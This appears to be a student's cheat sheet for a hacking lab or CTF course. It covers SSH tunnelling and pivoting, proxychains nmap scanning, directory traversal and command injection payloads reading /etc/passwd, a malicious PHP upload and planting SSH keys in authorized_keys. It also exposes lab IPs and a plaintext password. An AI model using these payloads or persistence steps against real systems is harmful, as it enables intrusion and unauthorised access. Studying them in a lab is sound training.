# Security
MIDY-003-M
USERINFO::http://10.50.21.3/classinfo.html
CTFd::http://10.50.20.250:8000

xfreerdp /v:10.50.29.185 /u:student +clipboard +dynamic-resolution +glyph-cache

Stack: 1 	
Username: MIDY-003-M 	
Password: 98DjctjRf4TQpHB ---- password
Lin.internet: 10.50.28.189
Lin.Ops: 10.50.25.1
Win.Ops: 10.50.29.185

## SSH
ssh student@10.50.28.189 -D 9050
ssh student@10.50.28.189 -L1111:192.168.28.111:8080

ssh -MS /tmp/jump student@10.50.28.189 
ssh -S /tmp/jump dummy
ssh -S /tmp/jump dummy -O forward -D 9050 dummy  --- DYNO port 
ssh -S /tmp/jump dummy -O cancel -D 9050 dummy  --- DYNO port 

proxychains nmap -Pn -T4 -n -p1-10000 192.168.128.111

ssh -S /tmp/jump -O forward -L1111:192.168.28.111:80 DUMB
ssh -S /tmp/jump -O forward -L2222:192.168.28.111:8080 DUMB
ssh -S /tmp/jump -O forward -L3333:192.168.28.111:2222 DUMB
ssh -MS /tmp/T1 student@127.0.0.1 -p3333


## NMAP scanning
HOST DISCOVERY: 
    for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
    
 ///NMAP scripts --
    --script http-enum.nse
    --script smb-os-discovery.nse //only with windows
 
PORT ENUMERATION:  
    sudo proxychains nmap -Pn -T4 -sT -p1-10000 192.168.28.111 2>/dev/null

PORT INTERIGATION:  
    proxychains nc 192.168.28.111 80

# Web Expliotation (XSS)
**Requests**
GET
POST
HEAD
PUT

**HTTP Response Codes**
10X == Informational
2XX == Success
30X == Redirection
4XX == Client Error
5XX == Server Error

https://user-agents.net/lookup

Check for Robots.txt

sudo apt install nikto -y

nikto -h 10.50.40.14

**Attack Methods**
//Cookie script

//Directory Traversal(GET) -- myfile=../../../../etc/passwd
//Directory Traversal(POST) -- File to read [../../../../etc/passwd]

//Malicious File Upload
Bad.php -- on lin-ops

//Command Injection
;whoami
;cat /etc/passwd
;ls -latr & netstat -rn
|| ifconfig

//SSH Key Upload
ssh -keygen -t rsa
cat ~/.ssh/id_rsa.pub  --copy this
ls -la /users/home/directory      --check if .ssh exists
mkdir /users/home/directory/.ssh   --make .ssh in users home folder if it does not exist
echo "your_public_key_here" >> /users/home/directory/.ssh/authorized_keys  -- puts ssh key in dir
 cat /users/home/directory/.ssh/authorized_keys  -- verify


















